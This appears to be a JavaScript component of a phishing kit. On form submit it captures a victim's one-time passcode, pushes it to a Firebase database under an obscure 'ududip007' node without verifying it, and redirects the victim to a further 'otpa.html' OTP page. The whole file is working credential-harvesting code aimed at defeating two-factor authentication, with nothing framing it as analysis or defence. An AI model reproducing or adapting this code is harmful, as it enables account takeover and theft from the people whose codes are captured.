
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var otp = getElementVal("otp");

  

  saveMessages(otp);

  // redirect to OTP page
  window.location.href = "otpa.html";
}

const saveMessages = (otp) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
    OTP01: otp,
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

